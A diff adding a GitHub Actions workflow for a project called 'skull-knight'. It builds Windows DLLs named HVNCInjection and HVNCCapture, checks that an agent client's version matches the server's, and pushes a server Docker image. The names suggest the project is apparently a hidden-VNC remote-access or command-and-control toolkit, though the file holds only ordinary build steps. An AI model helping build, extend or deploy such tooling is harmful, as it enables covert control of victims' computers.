@@ -1,0 +1,132 @@
+name: skull-knight-ci
+
+on:
+  push:
+    tags:
+      - 'v*'
+  workflow_dispatch:
+
+env:
+  REGISTRY: ghcr.io
+  IMAGE_NAME: ${{ github.repository }}
+
+jobs:
+  build-hvnc-dll:
+    runs-on: windows-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Build HVNCInjection DLL with MSVC
+        shell: cmd
+        run: call build-hvnc-dll.bat
+
+      - name: Build HVNCCapture DLL with MSVC
+        shell: cmd
+        run: call build-hvnc-capture-dll.bat
+
+      - name: Upload HVNC DLLs
+        uses: actions/upload-artifact@v4
+        with:
+          name: hvnc-dll
+          path: |
+            skull-knight-server/dist-clients/HVNCInjection.x64.dll
+            skull-knight-server/dist-clients/HVNCCapture.x64.dll
+          if-no-files-found: error
+          retention-days: 1
+
+  build-and-push:
+    needs: build-hvnc-dll
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      packages: write
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Download HVNC DLLs
+        uses: actions/download-artifact@v4
+        with:
+          name: hvnc-dll
+          path: skull-knight-server/dist-clients
+
+      - name: Read Source Version
+        id: srcver
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          client_version=$(grep -oP 'var\s+AgentVersion\s*=\s*"\K[0-9]+\.[0-9]+\.[0-9]+' skull-knight-client/cmd/agent/config/config.go)
+          server_version=$(grep -oP 'export\s+const\s+SERVER_VERSION\s*=\s*"\K[0-9]+\.[0-9]+\.[0-9]+' skull-knight-server/src/version.ts)
+          package_version=$(node -p "require('./skull-knight-server/package.json').version")
+
+          if [[ -z "$client_version" || -z "$server_version" || -z "$package_version" ]]; then
+            echo "Failed to parse one or more version values from source files" >&2
+            exit 1
+          fi
+
+          if [[ "$client_version" != "$server_version" || "$client_version" != "$package_version" ]]; then
+            echo "Version mismatch detected:" >&2
+            echo "  client(config.go): $client_version" >&2
+            echo "  server(version.ts): $server_version" >&2
+            echo "  package(package.json): $package_version" >&2
+            exit 1
+          fi
+
+          major="${client_version%%.*}"
+          rest="${client_version#*.}"
+          minor="${rest%%.*}"
+
+          echo "version=$client_version" >> "$GITHUB_OUTPUT"
+          echo "major=$major" >> "$GITHUB_OUTPUT"
+          echo "minor=$minor" >> "$GITHUB_OUTPUT"
+
+      - name: Validate Tag Matches Source Version
+        if: startsWith(github.ref, 'refs/tags/v')
+        shell: bash
+        run: |
+          set -euo pipefail
+          tag_version="${GITHUB_REF_NAME#v}"
+          src_version="${{ steps.srcver.outputs.version }}"
+          if [[ "$tag_version" != "$src_version" ]]; then
+            echo "Tag version ($tag_version) does not match source version ($src_version)" >&2
+            exit 1
+          fi
+
+      - name: Normalize image name
+        run: echo "IMAGE_NAME=${GITHUB_REPOSITORY,,}" >> $GITHUB_ENV
+
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@v3
+
+      - name: Log in to GitHub Container Registry
+        uses: docker/login-action@v3
+        with:
+          registry: ${{ env.REGISTRY }}
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Extract metadata
+        id: meta
+        uses: docker/metadata-action@v5
+        with:
+          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
+          tags: |
+            type=raw,value=${{ steps.srcver.outputs.version }}
+            type=raw,value=${{ steps.srcver.outputs.major }}.${{ steps.srcver.outputs.minor }}
+            type=raw,value=${{ steps.srcver.outputs.major }}
+            type=raw,value=latest
+
+      - name: Build and push server image
+        uses: docker/build-push-action@v5
+        with:
+          context: .
+          file: ./Dockerfile
+          push: true
+          tags: ${{ steps.meta.outputs.tags }}
+          labels: ${{ steps.meta.outputs.labels }}
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+          platforms: linux/amd64,linux/arm64
